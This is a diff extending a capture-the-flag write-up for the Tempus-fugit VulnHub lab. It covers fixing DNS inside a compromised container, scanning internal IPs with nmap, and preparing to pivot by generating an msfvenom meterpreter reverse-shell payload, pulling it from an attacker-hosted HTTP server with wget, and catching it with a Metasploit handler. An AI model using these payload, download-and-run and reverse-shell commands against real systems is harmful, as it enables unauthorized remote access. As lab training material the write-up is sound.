@@ -111,4 +111,31 @@ Since there are some files we found with `ls` command, lets examine the files.
  
 ![resolv](https://github.com/noobfromPitt/CTFadventures/blob/master/vulnhub/Tempus-fugit/images/resolv.png)
 
-dns resolution of mofo.pwn might reveal more details. I am stuck at this point as there is no `dig` installed in the docker and `apk add bind-utils` is not working. So, this is still a work in progress
+dns resolution of mofo.pwn might reveal more details. The machine has only `nslookup` installed by default, which is not of much help. I tried to install `bind-tools` but it alwasys returned error. 
+//IMAGE: 1-apkadderror
+To debug this further, I used `wget` to download the tar.gz, but it said `wget: bad address 'dl-cdn.alpinelinux.org'`. That means there is a problem with DNS resolution. I tried to ping the alpinelinux.org using its ip, which worked. So I added 8.8.8.8 to the nameserver in */etc/resolv.conf*. It worked this time and I installed bind-tools and also nmap.
+
+Since we found more credentials from `cmscreds.txt`, there must be a place where these credentials should be used. As we have nmap working now, we can use it to see if there are any other ports open on these three ips
+
+//IMAGE: 2-nmapips
+Since `172.19.0.1` is using port 80, i tried to download the page its hosting using `wget 172.19.0.1:80`. It has downloaded an index.html whih seemed to be similar to the one we encountered on the first tempus-fugit site. There must be a better way to view the site hosted on this ip.
+
+We can use port forwarding from remote ip to our kali box. This can be done using metasploit or socat. [This](https://medium.com/@nikosch86/how-to-metasploit-behind-a-nat-or-pivoting-and-reverse-tunneling-with-meterpreter-1e747e7fa901) and [this](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/) are good resources to understand this process better. 
+
+Before port forwarding, we need to establish a meterpreter session. For this, we first create a payload using `msfvenom -p msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.12 LPORT=4444 -f elf > shell.elf` to create a `.elf`. Next we send the payload to docker (We can spawn a simple http server download the payload using wget or curl). Spawn server from the drectory where payload is present using `python -m SimpleHTTPServer 9090` and on docker, we download using `wget 10.0.2.12:9090/shell.elf`
+
+Next, we'll start a metasploit server to handle the traffic coming after port forward. Use below commands to start the handler
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST 10.0.2.12
+run
+
+[*] Started reverse TCP handler on 10.0.2.12:4444
+```
+
+Next, `chmod +x shell.elf` and run it by `./shell.elf`. This will start the meterpreter session.
+
+Now, we'll start the port forwarding
